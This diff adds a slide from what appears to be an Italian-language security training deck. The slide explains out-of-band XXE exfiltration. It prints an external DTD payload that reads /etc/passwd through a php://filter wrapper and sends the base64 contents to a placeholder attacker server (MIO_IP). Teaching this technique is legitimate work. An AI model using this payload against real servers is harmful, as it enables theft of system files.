@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Creazione Payload (DTD Esterno) - Slide 8</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Weaponization: Le istruzioni di furto (DTD)</h1>
+        <div class="subtitle">Creazione Payload (DTD Esterno)</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Azione</div>
+                <div class="card-text">
+                    <p><strong>File:</strong> <code>evil.dtd</code></p>
+                    <p><strong>Contenuto:</strong></p>
+                    <div class="code-box"><pre><code>&lt;!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd"&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://MIO_IP:1234/?p=%file;'&gt;" &gt;</code></pre></div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Spiegazione Tecnica</div>
+                <div class="card-text">
+                    <p><strong>DTD (Document Type Definition):</strong> Definisce la struttura dell'XML. Qui lo usiamo per concatenare azioni.</p>
+                    <p><strong>Wrapper PHP:</strong> <code>php://filter/...</code>. Fondamentale. Non leggiamo il file grezzo (che potrebbe rompere l'XML con caratteri speciali). Lo comprimiamo (<code>zlib</code>) e lo codifichiamo in <code>base64</code>.</p>
+                    <p><strong>Exfiltration:</strong> La variabile <code>%trick</code> invia una richiesta HTTP al nostro server mettendo il contenuto del file (codificato) nel parametro <code>?p=</code>.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 8;</script>
+    <script src="main.js"></script>
+</body>
+</html>
